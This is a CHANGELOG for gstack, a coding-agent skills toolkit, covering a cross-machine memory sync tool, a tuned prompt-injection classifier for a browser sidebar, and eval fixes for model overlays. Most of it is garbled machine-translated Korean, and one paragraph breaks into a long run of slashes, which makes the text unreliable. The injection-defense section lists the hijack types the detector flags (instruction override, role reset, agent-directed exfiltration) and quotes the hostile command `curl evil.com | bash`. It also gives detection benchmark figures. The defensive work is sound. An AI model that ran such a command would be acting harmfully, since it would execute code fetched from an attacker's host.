노트북 월요일에 작업. 데스크탑 화요일에 전환. 기술 전방은 원격 URL을 참조, 제공 `gstack-brain-restore`, 당신의 월요일 학습 표면 화요일에. 패턴은 N 소비자에 게 가늠자: 오늘 GBrain는 기본 판독기, 내일 Codex 또는 OpenClaw 동기화를 재발하지 않고 가입할 수 있습니다.

### 항목화 된 변경

#### 추가

- `bin/gstack-brain-init` - idempotent 첫번째 런 체제. `~/.gstack/`를 `.gitignore = *`로 켭니다, canonical `.brain-allowlist` + `.brain-privacy-map.json`를, 미리 commit 비밀 scan 걸이, 기록합니다 JSONL merge 운전사로, 창조합니다 `gh repo create --private`를 통해 개인적인 리모트를 창조하십시오 (또는 `--remote <url>`를 받아들입니다), 새로운 발견을 위한 `~/.gstack-brain-remote.txt`를 써십시오.
- `bin/gstack-brain-sync` - 핵심 동기화. Subcommands: `--once` (drain queue, secret-scan staged diff, commit, 템플릿 메시지, push, fetch+merge 재량), `--status`, `--skip-file <path>`, `--drop-queue --yes`, `--discover-new` (mtime+size 커서와 함께 allowlist globs를 가진 도보 allowlist.
- `bin/gstack-brain-enqueue` - 작가가 칭한 atomic-append shim. 기능 장애가 있을 때 침묵의 노-op.
- `bin/gstack-brain-consumer` + `bin/gstack-brain-reader` (symlink alias) - `consumers.json`에 있는 소비자/reader 레지스트리를 관리합니다. "reader", 내부 "consumer"를 사용하는 사용자 인터페이스.
- `bin/gstack-brain-restore` - 안전 게이트가있는 새로운 기계 부츠 스트랩 ( 위험한 클로버, 재등록 merge 드라이버, 토큰이 기계 로컬로 유지되기 때문에 per-consumer 토큰에 대한 신속한).
- `bin/gstack-brain-uninstall` - 깨끗한 꺼짐. `.git` + `.brain-*` 파일 + `consumers.json` + 구성 키를 제거합니다. 사용자 데이터 (라이닝 등)을 보존하십시오. GitHub 저장소를 위해 `--delete-remote` 선택 `--delete-remote`.
- `bin/gstack-jsonl-merge` - git merge 드라이버. ISO `ts` 필드에 의해 컨캐스트레이션; SHA-256 해시가 누락될 때 `ts`가 누락됩니다.
- `scripts/resolvers/preamble/generate-brain-sync-block.ts` - preamble bash 블록. 새로운 기계 복원 힌트, 일회성 개인 정보 보호 정지 게이트, 기술 시작 + 끝에서 `--once`, 일회성 자동 잡아당기기, `BRAIN_SYNC:` 각 기술 실행에 상태 선.
- `docs/gbrain-sync.md` - 사용자 가이드 (설정, first-use, restore, 개인 정보 보호 모드, 비밀 보호, 제거).
- `docs/gbrain-sync-errors.md` — 오류 조회 인덱스 (problem / 원인 / 모든 사용자 접근 오류에 대한 수정).
- `test/brain-sync.test.ts` - 27-test consolidated suite: config 고립, 수은 원자성, merge 운전사, 모든 6개의 regex 가족, init+sync+restore 둥근 지구의 맞은편에 비밀 검사, 자료, `--discover-new` cursor idempotence, `--skip-file` 구제.

#### 변경

- `bin/gstack-config` - 2개의 유효성 열쇠 (`gbrain_sync_mode` enum, `gbrain_sync_mode_prompted` bool)를 추가했습니다. 또한 시험 고립 (Codex v2 고침)를 위해 `GSTACK_HOME` env override를 따라 `GSTACK_STATE_DIR`를 허용하십시오.
- `bin/gstack-learnings-log`, `gstack-timeline-log`, `gstack-review-log`, `gstack-developer-profile` — 각 증가는 그것의 국부적으로 쓰기 후에 `gstack-brain-enqueue` 외침을 얻었다. 불을 위해, sync가 떨어져 있을 때 침묵하는 no-op.
- `bin/gstack-timeline-log` 헤더 코멘트 — 업데이트된 "local-only, 결코 어디서나 전송" 새로운 개인 정보 보호 sync 계약을 반영하기 위해 (사용자가 `full` 모드로 선택하면만 적용).
- `scripts/resolvers/preamble.ts` - 새로운 `generateBrainSyncBlock`에 있는 구성 뿌리 철사.
- `README.md` — `docs/gbrain-sync.md`와 `docs/gbrain-sync-errors.md`에 연결하는 docs-table 입장과 `docs/gbrain-sync-errors.md`의 가까이에 GBrain sync" 단면도를 가진 새로운 “Cross-machine 기억.

#### 기여자

- Sync는 `GSTACK_HOME=/tmp/test-$$`를 존중하므로 실제 `~/.gstack/config.yaml`로 흠뻑 빠지게 합니다. 새로운 테스트 `test/brain-sync-env-isolation` 로직은 통합된 스위트에 구워졌습니다.
- 소비자 레지스트리는 `consumers.json` (synced); 토큰은 `gstack-config` (현지, 결코 동기화되지 않음)에 머물렀습니다. 새로운 기계에 토큰을 위한 재개 시프가 됩니다.
- 메르지 드라이버는 로컬 `git config merge.<name>.driver=...` 등록을 요구, 단지 `.gitattributes`. 둘 다 `init` 그리고 `restore` 그들을 등록; 그들을 제거하지.
- 프리콤밋 후크는 방어적인 심도만 하다. 1차 비밀 검사는 `gstack-brain-sync --once` BEFORE staging 에서 실행한다.
- fnmatch glob 엔진은 `**` git의 gitignore 를 처리하지 않습니다. allowlist는 대신 명시된 1단계와 2단계 패턴을 사용합니다.
- GBrain HTTP ingest endpoint 계약은 크로스 프로젝트 의존성 (실제로 개 식품에 대한 v1 차단제로 끌어)입니다. v1의 gbrain-sync 배의 이 branch에 관계없이; 분리 된 branch/repo에 GBrain-side 작업 토지.

#### 알기 후속

- `test/brain-sync.test.ts` — 12의 27의 시험은 첫번째 bun-test 뛰기에 통과합니다; 나머지 15는 bun-test의 5s default timeout (spawnSync-heavy git 가동)를 명중합니다. 행동 도중 통합 연기를 통해 확인되는 행동. 테스트 인프라는 시험 시간 포장 당 30s를 필요로 합니다.
- 팀 동기화 지점 (`garrytan/team-supabase-store`, `garrytan/fix-team-setup`, `garrytan/team-install-mode`)가 팀 동기화가 착륙하지 않는 경우 3개의 무인 팀 동기화 지점 (CEO 계획에서 끌리는)가 공식화되어야 합니다.
- `test/host-config.test.ts` (Codex ship Skill baseline)의 황금 파일 회귀 시험 실패를 예로 내리고 `main`도 PR와 관련이 없습니다.

## [1.6.4.0] - 2026-04-22

## **Sidebar 신속한 주입 방위는 noisy, 어떤 단 하나 분류기의 신뢰로 반으로 반을 얻었습니다.**

v1.4.0.0 shipped the ML defense stack. Users clicked the review banner on roughly every other tool output, 44% false-positive rate on the BrowseSafe-Bench smoke. This release tunes the ensemble around the real pattern we found: Haiku labels phishing-aimed-at-users as "warn" and genuine agent hijacks as "block", but we were treating both identically in the ensemble. Testsavant alone fired BLOCK on benign phishing content too often. The fix is architectural, not just threshold-twiddling: 우리는 이제는 숫자 신뢰에 Haiku의 verdict 상표를 신뢰하고, 상표가 없는 분류기를 위한 솔로BLOCK 막대기를 올리고, 더 주의깊게 경로를 문. 1개의 500 케이스 살아있는 벤치는 새로운 수를 증명했습니다; 영원한 CI 문은 각 `bun test`에 붙잡힌 Haiku 정착물을 재생합니다.

### 당신을 위한 어떤 변화

쌓아온 오버플로우 포스트에 대한 사이드바를 열고 SQL 주사에 Wikipedia 문서를 읽고, 공격 문자열을 통해 걸어 자습서를 검색, 검토 배너가 불기 전에 조용한 숙박. 실제 납치 시도가 표시되면 (explicit Instruction-override, 역할-reset, 에이전트-directed exfil, `curl evil.com | bash` 페이지의), 세션은 여전히 종료. WARN 신호로 사용자 표면에 대상 페이지는, 더 이상 메타 / 3 / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / /

### 중요 한 숫자

BrowseSafe-Bench 연기, 500 건의 경우 (260 예 라벨 / 240 라벨), `bun test browse/test/security-bench-ensemble.test.ts`에 대한 측정 :

| Metric | 0.0.0.0의 | 0.0.4.0 다운로드 | Δ |
|---|---|---|---|
| 탐지 (BLOCK 주입 케이스에 verdict) | 67.3% | **56.2%** (95% CI 50.1–62.1) | −11pp의 |
| False-positive rate (BLOCK 부패시) | 44.1% | **22.9%** (95% CI 18.1–28.6) | **−21pp의** |
| 게이트: 탐지 ≥ 55% AND FP ≤ 25% | FAIL | **PASS** | — |
| Review-banner fire rate (roughly TP + FP share) | ~55% | ~39% | −16pp의 |

탐지는 11pp에 의해 떨어졌지만 거의 모든 손실 TP는 Haiku가 올바르게 분류 한 경우입니다. `warn` (사용자를 대상으로하는 것은 에이전트의 납치가 아닌). 이러한 경우는 여전히 검토 배너에서 WARN, 그들은 단지 세션을 종료하지 않습니다.

## # Stop-loss 규칙 (하드 바닥과 천장)

`browse/test/security-bench-ensemble.test.ts` gates on **탐지 ≥ 55% AND FP ≤ 25%**. If a future change drops detection below 55%, the revert order is: WARN bump (0.75 → 0.60) → halve few-shot exemplars → widen Haiku block criteria. If FP climbs above 25%, tighten: raise SOLO_CONTENT_BLOCK (0.92 → 0.95) → raise WARN (0.75 → 0.80) → add anti-FP few-shots. Iterations write to `~/.gstack-dev/evals/stop-loss-iter-N-*.json` for audit trail.

### 항목화 된 변경

#### 변경

- `browse/src/security.ts` - 새로운 `THRESHOLDS.SOLO_CONTENT_BLOCK = 0.92` 라벨 없는 콘텐츠 클래스터. 솔로 BLOCK 이제 testavant/deberta 신뢰 ≥ 0.92 (최대 0.85)를 요구합니다. Transcript-layer 솔로 BLOCK는 `meta.verdict === 'block'` AND 신뢰 ≥ 0.85를 요구합니다. ensemble 2-of-N 경로는 `THRESHOLDS.WARN = 0.75` (최대 0.60)를 유지합니다.
- `browse/src/security.ts` — `combineVerdict`는 transcript 층에 상표 첫번째 투표를 위해 rewritten: `verdict === 'block'` 신뢰 ≥ LOG_ONLY (0.40)에 `verdict === 'warn'`는 자신감을 가진 전진입니다; 누락된 `meta.verdict`는 자신감을 가진 전진한 만에 경고합니다 ≥ WARN (단면 정진). 미칭 메타는 전 v2 시렁이 신호를 가진 뒤쪽 겸용성을 위한 결코 막 열애하지 않습니다.
- `browse/src/security-classifier.ts` - Haiku 모형은 `claude-haiku-4-5-20251001` (no 더 긴 목록은 `haiku` 별명으로 침묵하게 전달합니다). `claude -p`는 지금 `os.tmpdir()`에서 천막을 떠납니다 그래서 CLAUDE.md 프로젝트 상황은 Haiku의 체계로 누출하지 않으며 분류하는 것을 거부합니다. 15s에서 45s (생산 측정은 `claude -p`를 위한 17-33s 끝을 가지고 갑니다)에 범람. Haiku의 체계에 대한 경고를 갖춰.
- `browse/src/security-classifier.ts` - Haiku는 `block`/`warn`/`safe` 기준과 8개의 몇몇 샷 exemplars (파괴물, 역할 재설치, 에이전트 지시한 악의적인 코드 → 구획을 가진 재작동합니다; phishing/social-engineering 표적 사용자 → warn; 토론 주입 및 dev 내용 → 안전).

#### 추가

- `browse/test/security-bench-ensemble-live.test.ts` - `GSTACK_BENCH_ENSEMBLE=1`를 통해 선택에서 살아있는 벤치. `GSTACK_BENCH_ENSEMBLE_CONCURRENCY`를 통해 노동자 수영장 concurrency (default 8). `GSTACK_BENCH_ENSEMBLE_CASES`를 통해 결정적인 subsampling. `browse/test/fixtures/security-bench-haiku-responses.json`에 500 케이스 정착물을 붙잡고 `~/.gstack-dev/evals/`에 eval 기록 플러스. 정지 손실은 `stop-loss-iter-N-*.json`를 쓰고 canonical 정착물을 겹쳐 쌓입니다.
- `browse/test/security-bench-ensemble.test.ts` — CI-tier 정착물 재생 문. 탐지 ≥ 55% AND FP ≤ 25%를 원조하십시오. 정착물이 AND 안전 층 파일이 branch diff에서 바뀐 때 실패 닫히는 실패는 (`git diff base`를 사용하십시오 둘 다 투입되고 uncommitted 편집을 붙잡는).
- `browse/test/fixtures/security-bench-haiku-responses.json` — 500 케이스는 schema-version 헤더, 핀 모델 문자열 및 구성 요소 해시와 하이쿠 정착물을 붙잡았습니다.
- `docs/evals/security-bench-ensemble-v2.json` - 내구성이 있는 per-run 감사 기록: TP/FN/FP/TN, 손잡이 국가, 스키마 해시, 이탈.

#### 고정

- `browse/test/security.test.ts`, `browse/test/security-adversarial.test.ts`, `browse/test/security-adversarial-fixes.test.ts`, `browse/test/security-integration.test.ts` - 라벨-First semantics를 위해 새롭게 한. 6개의 새로운 결합Verdict 시험: warn-as-soft-signal, 구획 상표 ensemble, 3 방법 구획 - 와튼, 복ucination 가드 (verdict=block에 신뢰 0.30 → warn-vote), 위 지면 구획 (verdict=block에 0.50 → 구획 정진한), 뒤판 메타.

#### 기여자

- 500 케이스 연기 데이터 세트는 `~/.gstack/cache/browsesafe-bench-smoke/test-rows.json` (260 yes/240 no)에 있습니다. 보안 층 코드를 수정한 후에 정착물을 재생하기 위하여는, `GSTACK_BENCH_ENSEMBLE=1 bun test browse/test/security-bench-ensemble-live.test.ts` (~25 분은 하이쿠 비용에서 4, ~$0.30를 암호로 합니다).
- 정착물 스키마 해시는 모형, 신속한 SHA, exemplars SHA, 문턱, 결합자 개정 및 dataset 버전을 포함합니다. 어떤 변화든지에 아무 변화든지 정착물을 유효하지 않으며 실패한 CI를 통해 신선한 살아있는 붙잡음을 강제합니다.

## [1.6.3.0] - 2026-04-23

## **Codex 마지막으로 무엇을 요구 하는지 설명합니다. No 더 많은 "ELI10 을 클릭 하십시오" 10 시간 연속.**

v1.6.2.0에 따라. Claude-verified fix를 발송한 후, 사용자는 Codex (GPT-5.4)를 보고한 ELI10 설명과 RECOMMENDATION 선을 건너 뛰기 것과 같은 패턴 10/10배 실패했습니다. AskUserQuestion 호출에 RECOMMENDATION 선을, forcing 설명서 “ELI10를 강제하고 추천하는 것을 잊지 마십시오” 각 시간마다 재 직업을 끄십시오. 루트 원인: `gpt.md` 모형 오버레이의 No는 preNo를 위한 preCodex를 실행하는 것을 결정했습니다.

### 중요 한 숫자

출처: 새로운 `test/codex-e2e-plan-format.test.ts`, 설치 gstack Codex 호스트에 `codex exec`를 통해 구동되는 4개의 케이스. 정기적인 층 (GPT-class non-determinism).

| 제품정보 | 제품정보 | 전구 (측정, 10/10배) | 포스트픽스 (v1.6.3.0) |
|---|---|---|---|
| plan-ceo-review 모드 선택 | 의 의 | No ELI10 단락, no RECOMMENDATION 선 | ✓ ELI10 + RECOMMENDATION + "옵션은 종류와 다릅니다"주의 |
| 플랜 일람 | coverage | No ELI10 단락, 베어 옵션 목록 | ✓ ELI10 + RECOMMENDATION + `Completeness: 5/7/10` |
| 플랜트-eng-review 적용 문제 | coverage | Bare 옵션 목록 | ✓ ELI10 + RECOMMENDATION + 완전성 |
| 플랜 - eng-review 건축 선택 | 의 의 | 직물을 입힌 완전한 충전물에 종류 질문 | ✓ ELI10 + RECOMMENDATION + "옵션은 종류와 다릅니다"주의 |

모든 4 Codex 케이스는 ELI10 길이 바닥 (> 400의 숯 당 질문을 당 prose)를 통과합니다. 517s 가득 차있는 eval를 위해; Codex는 방법 Anthropic를 부르는 당 계산하지 않습니다.

### 항목화 된 변경

#### 고정

- Codex no는 AskUserQuestion 호출에 Simplify/ELI10 단락을 더 긴 움직입니다. `gpt.md`는 이제 AskUserQuestion 내용에서 "No preamble" 규칙을 명시적으로 쫓아냅니다. 직접적인 대답에 필러를 건너 뛰지만, 모든 AskUserQuestion는 전체 Re-ground + ELI10 + RECOMMENDATION + 옵션 형식을 얻습니다.
- Codex no는 더 긴 RECOMMENDATION를 옵션 목록에 축소합니다. 그것은 질문 유형에 관계없이 자신의 선에, 매번 착륙합니다.

#### 변경

- `scripts/resolvers/preamble/generate-ask-user-format.ts` - "Simplify (ELI10, ALWAYS)"에 이름이 붙은 단계 2는 "선택적인 동성, preamble" 튀길지 않는 것을 가진 "를 곱합니다. 단계 3 "Recommend (ALWAYS)" 강하게 한: "Never omit, 결코 선택권 명부로 붕괴하지 마십시오." 바짝 죄는 모든 호스트에 적용되지만 Codex는 그것을 가장 느꼈습니다.
- `model-overlays/gpt.md` - 새 "AskUserQuestion 는 NOT preamble" 섹션을 추가하여 모델이 백업 및 방출하는 경우 전체 형식을 방출하는 경우 ELI10 단락 또는 RECOMMENDATION 선을 건너 뛰기 위해 스스로를 찾을 수 있습니다.

#### 기여자

- `test/codex-e2e-plan-format.test.ts` - Claude 버전을 미러링하는 4개의 주기적인 층 Codex eval 케이스. `test/helpers/codex-session-runner.ts`를 `sandbox: 'workspace-write'`로 기존 `test/helpers/codex-session-runner.ts` 마구를 통해 RECOMMENDATION regex, 적용 vs-kind Completeness 나누기, ELI10 길이 바닥 (400+ 숯)를 통해 RECOMMENDATION regex.
- 모든 T2 기술은 모든 호스트 (클래드, 코덱, 공장, gbrain, gpt-5.4, 헤르메스, kiro, opencode, openclaw, 슬레이트, 커서)를 통해 재생됩니다. 골든 고정 새로 고침. `test/gen-skill-docs.test.ts` ELI10 assertion 새 "Simplify (ELI10"머리 일치하도록 업데이트되었습니다.

## [1.6.2.0] - 2026-04-22

## **플랜 리뷰는 다시 추천을 제공합니다. 그리고 우리는 마침내 모드 선택에 10/10 점수를 인정하는 것은 아무것도 의미하지 않습니다.**

A user on Opus 4.7 reported `/plan-ceo-review` and `/plan-eng-review` stopped showing the `RECOMMENDATION: Choose X` line and the per-option `Completeness: N/10` score that used to make decisions quick. The fix ships both signals back, but with a sharper distinction: coverage-differentiated options get real scores (10 = all edges, 7 = happy path, 3 = shortcut), and kind-differentiated options (mode selection, A-vs-B architecture calls, cherry-pick Add/Defer/Skip) get the RECOMMENDATION plus an explicit `Note: 옵션은 종류와 다르지만 적용되지 않습니다. - no 완전 점수. ' 10/10 필러 대신 라인.

### 중요 한 숫자

출처: `test/skill-e2e-plan-format.test.ts`, 4개의 케이스는 `claude-opus-4-7`, ~$2에 가득 차있는 달리기 핀으로 꼿습니다. 주기적인 층 (비 결정적인 Opus 행동은 주간 cron, 당PR 문 아닙니다)를 가져옵니다.

| 질문 유형 | (v1.6.1.0) 이전 | (v1.6.2.0) 이후 |
|---|---|---|
| 형태 선택 (종류 다른) | `Completeness: 10/10` 모든 4개의 형태에 날조 | RECOMMENDATION + "옵션은 종류와 다릅니다"주의 |
| 접근 메뉴 (coverage-differentiated) | `**RECOMMENDATION:**` 마크다운-볼드되었지만 regex가 놓쳤다. | RECOMMENDATION + `Completeness: 5/7/10` 옵션 당 |
| Per-issue 적용 결정 | 현재, 일 | 현재 일 (변경되지 않음) |
| Per-issue 건축 선택 (일종 - 다른) | `Completeness: 9/9/5` 친절 한 질문에 직물 | RECOMMENDATION + "옵션은 종류와 다릅니다"주의 |

| Eval 패스 | Result | Cost |
|---|---|---|
| 1단계 기본라인(pre-fix) | 1/4의 간증 패스 (귀중의 증거) | $2.19 |
| 3 포스트픽스 | 4/4개의 assertions 통행 | $1.84 |
| 3b 이웃 회귀 단계 (`skill-e2e-plan.test.ts`) | 12/12 패스, no 편류 | $5.19 |

### 항목화 된 변경

#### 고정

- `RECOMMENDATION: Choose X` 이제는 `/plan-ceo-review` 및 `/plan-eng-review`의 AskUserQuestion에서 각 AskUserQuestion에 일관되게 나타납니다.
- `Completeness: N/10`는 적용중의 옵션에만 방출됩니다. 다른 시스템간에 건축 선택 (모드 선택, 다른 시스템 사이의 건축 선택, 체리 - 핑크 A/B/C)는 10/10 필러 대신 점수가 적용되지 않는 이유를 설명하는 일선주의를 방출합니다.

#### 변경

- `AskUserQuestion Format` 섹션에서 T2 전단은 이전 실행 단락을 두 개의 ALWAYS 프레임 규칙으로 나뉩니다. 3 "Recommend (ALWAYS)"을 단계 4 "Score completeness (이렇게)"을 단계로 삼습니다. 이 모든 T2 기술에 영향을줍니다 (~15 파일 재생).
- `Completeness Principle — Boil the Lake`는 현재 뚜렷하게 일치한 범위 Vs-kind를 주지 않습니다. 이 편집 없이는 두 개의 사전 위치가 중단될 것입니다.
- 섹션 0C-bis (패러치 메뉴) 및 섹션 0F (모드 선택) `plan-ceo-review/SKILL.md.tmpl`에서 이제는 짧은 앵커 라인을 수행하여 모델에 대한 질문 유형이 적용됩니다. `plan-eng-review/SKILL.md.tmpl`는 CRITICAL RULE 섹션에서 해당 앵커를 가져옵니다.

#### 기여자

- 새로운 테스트 파일 `test/skill-e2e-plan-format.test.ts`는 2개의 계획 기술에서 출력된 동사 AskUserQuestion를 붙잡고 적용 vs-kind 체재를 주장합니다. 에이전트을 쓰기 위하여 지시하십시오 MCP 도구를 부르기 보다는 오히려 `claude -p`에 AskUserQuestion 원본을 `$OUT_FILE`에 AskUserQuestion 텍스트를 쓰기 위하여 지시하십시오 (MCP는 안쪽 `claude -p`) 안쪽에 타전하지 않습니다.
- 동작이 Opus 4.7 비-determinism에 따라 달라지기 때문에 분류된 `periodic` 층은 흔들리고 구획 합병을 막을 것입니다.
- 골든 고정 장치 (`test/fixtures/golden/claude-ship-SKILL.md`, `codex-ship-SKILL.md`, `factory-ship-SKILL.md`) 새로 고침 새로운 형식 규칙을 반영하기 위해.

## [1.6.1.0] - 2026-04-22

## **Opus 4.7 마이그레이션, 검토. 오버레이는 모델 당 실제로 분할. 확인을 추적, fanout은 여전히 목록에.**

PR #1117 (itial Opus 4.7 마이그레이션)은 품질 격차와 올바른 아이디어를 발송했습니다. `/plan-ceo-review` + `/plan-eng-review` 쌍 Codex 외부 음성 표면 4 배 차단제 및 7개의 품질 격차. 이 릴리스 땅은 수정을 추가하고 `claude-opus-4-7`에 핀으로 꼿는 첫번째 eval를 추가합니다 그래서 우리는 측정하지 않고 asserting 활동을 멈추게 합니다.

### 중요 한 숫자

출처: `test/skill-e2e-opus-47.test.ts` eval, 두 개의 경우, 8개의 assertions, ~$2.50 `claude-opus-4-7`에서 전체 실행 당. 실행은 `~/.gstack/projects/garrytan-gstack/evals/`에서 저장됩니다. `~/.gstack/projects/garrytan-gstack/ceo-plans/2026-04-21-pr1117-opus-4-7-ship-review.md`의 증거를 검토하십시오.

| Surface | 전 (#1117 으로 shipped) | (v1.6.1.0) 이후 |
|---|---|---|
| `model-overlays/claude.md` | Opus-4.7-specific nudges는 각 `claude-*` 변종에 적용 | 분할: `claude.md`는 모형 가연물, `opus-4-7.md` 상속하고 4.7의 낭독을 추가합니다 |
| `ALL_MODEL_NAMES` `scripts/models.ts` | No `opus-4-7` 세토성 항목 | 추가; `claude-opus-4-7-*` 새로운 오버레이 경로 |
| `scripts/resolvers/utility.ts:372` 트레일러 fallback | 하드 코딩 `Claude Opus 4.6` | 일치 호스트 구성, Opus 4.7 default |
| `generate-routing-injection.ts` 정책 | 오래된 "ALWAYS invoke, NOT는 직접 대답합니다" | 일치 SKILL.md.tmpl " 의심의 여지없이, invoke" |
| `generate-routing-injection.ts` 기술명 | Stale `/checkpoint` (전 3개의 릴리스 이름을 변경했습니다) | `/context-save` + `/context-restore`, plus `/benchmark`, `/devex-review`, `/qa-only`, `/canary`, `/land-and-deploy`, `/setup-deploy`, `/open-gstack-browser`, `/setup-browser-cookies`, `/learn`, `/plan-tune`, `/health` |
| 음성 예 닫기 | "내가 발송하는 것?" (리틀 4.7 해석기에 배 우회) | "그것을 고치기 위해 저를." (검증 문 예약) |
| `"Fix ALL failing tests"` 판결 범위 | 비행, 전 관련 실패를 만질 수 있었습니다 | "이 branch가 도입되었거나 책임지지 않음"에 대한 경계 |
| `"Batch your questions"` 판결 | 한 번에 한 번씩 닿는 기술을 갖춰 | 예외를 끄는 Explicit; 기술 승리 |
| Opus 4.7 eval 적용 | 0 테스트는 `claude-opus-4-7`에 핀으로 꼿습니다 | 1 eval, 2건, `periodic` 층 |

| Eval 케이스 | Result |
|---|---|
| 정밀도를 여정 (3개의 긍정적인 + 3개의 부정적인 신속한s) | 3/3개의 긍정적인 경로는, 0/3의 부정적인 노선을 정확하게 갑니다. TP 100%, FP 0%. 대회 문턱. |
| Fanout A/B (3-file 읽기, 오버레이 ON 대 OFF) | 0개의 평행한 도구는 `claude -p`의 밑에 팔 둘 다에 첫번째 돌립니다. 아더레이션은 trivially, 실제적인 효력 unmeasured를 통과합니다. Claude Code의 진짜 마구 안쪽에 재 실행을 위한 P0 TODO로 앞으로 몰아. |

| 시험 스위트 | 의 전 | 후지후 |
|---|---|---|
| `bun test` 깨끗한 체크 아웃에 실패 | 10 (전출 flaky 타임아웃 + 2 새로운 황금 편류) | 0 |
| "no git에서 컴파일된 binaries" 테스트 실행 시간 | ~12.7s, 5s 타임아웃에 flaky | `fs.statSync` + 모드 필터와 함께 0.9s |
| 모수된 주인 연기 시험 | 7 stale 생성된 산출과 실패 | 오버레이 균열이 깨끗하게 재생한 후 모든 녹색 |

### Opus 4.7에서 gstack를 실행하는 누군가를 위한 무슨 이 뜻

Regenerating with `--model opus-4-7` now gives you a SKILL.md that carries the 4.7-specific nudges (fanout, effort-match, batch questions, literal interpretation), while Sonnet and Haiku users get the model-agnostic overlay without leakage. Routing gets the full skill inventory and a softer fallback so casual prompts like "wtf is this Python syntax" do not accidentally invoke `/investigate`. The fanout claim is honestly labeled "unverified under `claude -p`" with a P0 TODO rather than asserted. `bun test test/skill-e2e-opus-47.test.ts`를 `EVALS=1`로 실행하여 측정을 재현합니다. 이 구제의 전체 플랜 파일은 `~/.claude/plans/system-instruction-you-are-working-polymorphic-kazoo.md`에서 구합니다.

### 항목화 된 변경

#### 추가

- `{{INHERIT:claude}}`를 통해 `claude.md`에서 상속하는 새로운 `model-overlays/opus-4-7.md`. 4개의 Opus-4.7-specific nudges를 붙듭니다: 팬을 밖으로 (특히 구체적인 `[Read(a), Read(b), Read(c)]` 보기에), 노력 잡아당기기 단계, 당신의 질문을 던지고 (지점경 경계로), 리터 해석 인식 (지점경 경계로).
- `opus-4-7` `scripts/models.ts`의 `ALL_MODEL_NAMES`에 입력합니다. `resolveModel()`는 새로운 오버레이에 `claude-opus-4-7-*`를, 다른 모든 `claude-*` 변종합니다 `claude`로 경로를 계속합니다.
- `test/skill-e2e-opus-47.test.ts`: `claude-opus-4-7`에 핀으로 꼿는 첫번째 E2E. 2개의 케이스 (팬아웃 A/B, 여정 정밀도), 8개의 assertions, `periodic` 층. `EVALS=1`에 Gated.
- 새로운 라우팅 형태에 대한 `test/gen-skill-docs.test.ts`의 회귀 테스트 : asserts slash-prefixed 기술 참조 (`/office-hours` not `office-hours`), asserts `/context-save` + `/context-restore` 현재 ( stale `/checkpoint` 이름 회귀가 있음), assertserts " 의심의 여지가있을 때, invoke"정책은 현재 (강화 `ALWAYS invoke` 회귀가 있음).

#### 변경

- `model-overlays/claude.md` 모델로 돌아 가기 트리밍 된 판자 (도표 분야, 무거운 행동 전에 생각, Bash 이상 전용 도구. Opus-4.7-specific content move to `opus-4-7.md`.
- `scripts/resolvers/preamble/generate-routing-injection.ts`: SKILL.md.tmpl 정책 (" 의심, invoke에서), 이름 지인 stale `/checkpoint`에 일치해 `/context-save` + `/context-restore`에, 추가했습니다 12의 누락된 노선 (가장 지금 덮는 가득 차있는 기술 재고).
- `SKILL.md.tmpl` 라우팅 섹션: 동일한 12개의 누락된 경로 추가; 추가된 지점경 경계 "Fix ALL 실패 테스트"; 추가 명시된 포장 예외 "문제를 배치" 그래서 기술 워크플로우는 패딩.
- `scripts/resolvers/preamble/generate-voice-directive.ts`: 음성 예 닫히는 것은 "내가 발송하는 것"에서 "그것을 고치기 위하여 저를." (리틀 4.7 해석기에 전방적인 검토 문).
- `scripts/resolvers/utility.ts:372`: co-author 트레일러 fallback `Claude Opus 4.6` → `Claude Opus 4.7` (PR는 `hosts/claude.ts`를 업데이트했지만 이 추락을 놓았습니다).

#### 고정

- "No git"의 binaries를 컴파일한 `test/skill-validation.test.ts`의 binaries를 사용하여 `fs.statSync` + mode-100755 필터 대신 `xargs -I{} sh -c` 파일당 `xargs -I{} sh -c`를 사용합니다. 12.7s → 907ms, flaky-at-5s-timeout → 녹색.
- `test/team-mode.test.ts` 설정 테스트는 180s 예산을 받았습니다. `./setup`는 전체 설치 + Bun 이진 빌드 + 기술 재생을하고 60-90s를 가지고 있습니다. 5s default는 타이밍되었습니다.
- `origin/main` v1.6.0.0 (수파)에 근거를 두는 branch. VERSION + CHANGELOG는 CLAUDE.md에 있는 branch 장면 분야를 따릅니다: 주 1.6.0.0의 no 편류의 정상에 새로운 입장.

#### 기여자

- Eval 인프라는 이제 모델 핀 테스트를 지원합니다. `test/skill-e2e-opus-47.test.ts:mkEvalRoot(suffix, includeOverlay)`는 패턴입니다. `.claude/skills/`의 SKILL.md를 설치하고, CLAUDE.md를 명시적으로 routing CLAUDE.md를 작성하고, 선택적으로 A/B 팔을 위해 opus-4-7 오버레이를 인라인으로 합니다. `claude -p`는 시스템 컨텍스트로 자동 로드 SKILL.md 내용이 아니라, 오버레이는 CLAUDE.md에 줄이도록 합니다. /B는 하네스에 있는 관찰할 수 있는 관찰할 수 있습니다.
- 새로운 터치파일 항목: `fanout: overlay ON emits >= parallel calls...`와 `routing precision: positives route, negatives do not`, `test/helpers/touchfiles.ts`, `periodic` 둘 다. `model-overlays/`, `scripts/models.ts`, `scripts/resolvers/model-overlay.ts`, `SKILL.md.tmpl`, 또는 `scripts/resolvers/preamble/generate-routing-injection.ts` 변화 때만 불.
- Known gap (P0 TODO in `TODOS.md`): verify the fanout nudge under Claude Code's real harness, not `claude -p`. The claim in the overlay is unmeasured until that runs.

## [1.6.0.0] - 2026-04-21

## **쌍 에이전트 세션의 token 누출은 daemon를 두 개의 HTTP 청취자로 나누기 위해 닫히고, 1개의 항구를 미리 보전해서는 안됩니다 2개의 일 한 번에 일 수 있습니다.**

